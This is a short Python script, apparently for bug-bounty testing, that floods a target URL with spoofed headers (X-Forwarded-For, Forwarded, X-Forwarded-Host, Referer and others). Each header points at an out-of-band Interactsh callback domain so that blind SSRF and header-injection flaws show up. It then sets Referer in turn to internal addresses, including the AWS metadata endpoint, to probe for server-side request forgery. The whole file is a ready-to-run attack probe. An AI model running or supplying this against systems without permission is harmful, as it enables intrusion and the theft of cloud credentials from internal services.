import requests

# Interactsh URL for capturing OOB interactions
interactsh_url = "your-payload"

# Target URL
target_url = "your-in-scope-url"

# Headers designed to probe internal network and sensitive resources
headers = {
    "User-Agent": f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{interactsh_url}",
    "Referer": f"http://{interactsh_url}/ref",
    "Cf-Connecting_ip": f"spoofed.{interactsh_url}",
    "X-Real-Ip": f"spoofed.{interactsh_url}",
    "From": f"root@{interactsh_url}",
    "True-Client-Ip": f"spoofed.{interactsh_url}",
    "Client-Ip": f"spoofed.{interactsh_url}",
    "Forwarded": f"for=spoofed.{interactsh_url};by=spoofed.{interactsh_url};host=spoofed.{interactsh_url}",
    "X-Client-Ip": f"spoofed.{interactsh_url}",
    "X-Originating-Ip": f"spoofed.{interactsh_url}",
    "X-Wap-Profile": f"http://{interactsh_url}/wap.xml",
    "X-Forwarded-For": f"192.168.1.1, {interactsh_url}",  # Probing an internal IP address
    "Contact": f"root@{interactsh_url}",
    "X-Forwarded-Host": f"internal-service, {interactsh_url}",  # Probing internal service
    "X-Host": f"internal-service, {interactsh_url}",
    "X-Forwarded-Server": f"internal-service, {interactsh_url}",
    "X-HTTP-Host-Override": f"internal-service, {interactsh_url}",
    "Profile": f"http://{interactsh_url}/profile.xml",
    "Cache-Control": "no-transform"
}

try:
    response = requests.get(target_url, headers=headers)
    print("HTTP Status Code:", response.status_code)
except Exception as e:
    print(f"HTTP request failed: {e}")

# Example of further probing specific internal endpoints
internal_endpoints = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata service
    "http://192.168.0.1/admin",  # Common internal IP for routers
    "http://10.0.0.1",  # Example of another internal IP
]

for endpoint in internal_endpoints:
    headers["Referer"] = endpoint
    try:
        response = requests.get(target_url, headers=headers)
        print(f"Probed {endpoint} - HTTP Status Code:", response.status_code)
    except Exception as e:
        print(f"HTTP request failed for {endpoint}: {e}")
